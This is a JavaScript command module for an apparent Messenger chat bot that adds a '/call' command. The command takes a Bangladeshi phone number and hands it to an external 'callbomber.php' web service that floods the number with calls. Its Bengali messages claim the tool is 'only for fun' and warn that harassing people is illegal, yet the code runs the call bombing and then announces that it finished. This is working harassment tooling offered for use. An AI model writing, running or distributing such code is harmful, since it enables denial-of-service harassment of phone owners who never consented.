module.exports.config = { 

name: "call", 

version: "1.0.0", 

hasPermssion: 2, 

credits: "SUJON",

description: "কল বোম্বার, শুধুমাত্র বাংলাদেশি নাম্বারের জন্য", 

commandCategory: "Tool", 

usages: "/call 01xxxxxxxxx", 

cooldowns: 15, 

dependencies: { "axios": "" } 

}; 

 

module.exports.run = async ({ api, event, args }) => { 

const axios = require('axios'); 

const number = args[0]; 

 

if (!number || !/^01[0-9]{9}$/.test(number)) { 

return api.sendMessage("অনুগ্রহ করে সঠিক বাংলাদেশি নাম্বার দিন (উদাহরণ: /call 01xxxxxxxxx) দয়া করে কেউ খারাপ কাজে ব্যবহার করবেন না 🙂,\n ফাইলটি শুধুমাত্র মজা করার উদ্দেশ্যে তৈরি করা হয়েছে।", event.threadID, event.messageID); 

} 

 

api.sendMessage(`কল বোম্বিং শুরু হয়েছে: ${number} নম্বরে...📞💣\n কাউকে বিরক্ত করার জন্য এই টুল ব্যবহার সম্পূর্ণ নিষিদ্ধ এবং আইনত অপরাধ।`, event.threadID, async (err, info) => { 

try { 

const response = await axios.get(`https://tbblab.shop/callbomber.php?mobile=${number}`); 

setTimeout(() => { 

api.unsendMessage(info.messageID); 

}, 90000); 

 

return api.sendMessage(`✅ SUJON CHAT BOT কল বোম্বিং সম্পন্ন হয়েছে ${number} নম্বরে।`, event.threadID, event.messageID); 

} catch (error) { 

return api.sendMessage(`❌ ত্রুটি: ${error.message}`, event.threadID, event.messageID); 

} 

}); 

};